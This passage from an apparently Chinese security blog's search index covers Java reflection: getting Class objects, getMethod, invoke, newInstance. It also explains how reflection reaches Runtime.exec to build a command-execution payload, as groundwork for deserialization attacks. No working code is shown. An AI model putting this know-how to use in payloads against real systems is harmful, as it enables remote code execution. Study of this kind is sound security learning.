之后获取这个类的方法为getInstance。Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了： Runtime.exec有6个重载，第一个重载，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。invoke 的作用是执行方法，它的第一个参数是：1.如果这个方法是一个普通方法，那么第一个参数是类对象2.如果这个方法是一个静态方法，那么第一个参数是类 这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。 所以我们将上述命令执行的Payload分解一下就是： "},{"title":"java反射学习-1","date":"2021-08-25T13:14:04.000Z","url":"/2021/08/25/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-1/","categories":[["java","/categories/java/"]],"content":"学习java反序列化之前少不了学习反射，虽然之前学过，还是再学一遍 java反射机制的定义Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制 java的反序列化问题都基于反射机制 Java 反射机制的功能1.在运行时判断任意一个对象所属的类。2.在运行时构造任意一个类的对象。3.在运行时判断任意一个类所具有的成员变量和方法。4.在运行时调用任意一个对象的方法。5.生成动态代理。 Java 反射机制的应用场景1.逆向代码 ，例如反编译2.与注解相结合的框架 例如Retrofit3.单纯的反射机制应用框架 例如EventBus4.动态生成类框架 例如Gson 反射常见使用的方法获取类的方法：forname实例化类对象的方法：newInstance获取函数的方法：getMethod执行函数的方法：invoke 只有JVM能够创建Class对象 获取class对象三种方法一般我们获取class对象就有以下三种方法 1、类的.class属性第一种就是最简单明了的方式，我们可以通过类名的属性class获取。 2、实例化对象的getClass()方法第二种我们可以先实例化一个对象，之后在调用getClass()方法。 3、Class.forName(String className)：动态加载类第三种则是调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象。 总的来看 结果 但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。 而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用Class.forName方法去获取。 获取成员变量Field 获取成员方法Method 获取构造函数 利用反射创建类对象（重点）在前面我们获取了Class对象，之后展示了一系列获取成员变量、成员方法和成员函数的方式后，我们现在可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象。 使用的方式也特别简单，只需要通过forname方法获取到的class对象中进行newInstance方法创建即可。 利用反射机制创建类并执行方法"}]